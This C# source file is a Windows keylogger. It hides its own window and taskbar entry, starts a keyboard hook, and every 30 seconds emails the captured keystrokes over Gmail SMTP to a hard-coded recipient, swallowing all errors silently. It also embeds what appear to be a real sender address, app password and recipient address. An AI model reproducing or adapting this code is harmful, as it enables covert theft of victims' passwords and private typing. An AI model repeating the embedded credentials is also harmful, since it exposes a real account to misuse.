using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Keylogger
{
    public partial class MainForm : Form
    {
        private EmailSender _emailSender;
        private System.Windows.Forms.Timer _emailTimer;
        private bool _isRunning = false;

        public MainForm()
        {
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Visible = false;
            
            InitializeEmailSettings();
            InitializeTimer();
            StartKeylogger();
        }

        private void InitializeComponent()
        {
        }

        private void InitializeEmailSettings()
        {
            _emailSender = new EmailSender(
                smtpServer: "smtp.gmail.com",
                smtpPort: 587,
                senderEmail: "ssemih9747@gmail.com",
                senderPassword: "usjgppcrfunkduhs",
                recipientEmail: "semihsalman99@gmail.com"
            );
        }

        private void InitializeTimer()
        {
            _emailTimer = new System.Windows.Forms.Timer();
            _emailTimer.Interval = 30000;
            _emailTimer.Tick += (sender, e) => {
                string logContent = SimpleKeyboardHook.GetLogContent();
                
                if (!string.IsNullOrEmpty(logContent) && logContent.Length >= 50)
                {
                    try
                    {
                        bool success = _emailSender.SendKeystrokes(logContent);
                        if (success)
                        {
                            File.WriteAllText("keystrokes.log", "");
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                }
            };
        }

        private void StartKeylogger()
        {
            try
            {
                SimpleKeyboardHook.StartHook();
                _emailTimer.Start();
                _isRunning = true;
            }
            catch (Exception ex)
            {
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (_isRunning)
            {
                SimpleKeyboardHook.StopHook();
                _emailTimer.Stop();
            }
            base.OnFormClosing(e);
        }
    }

    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }
}
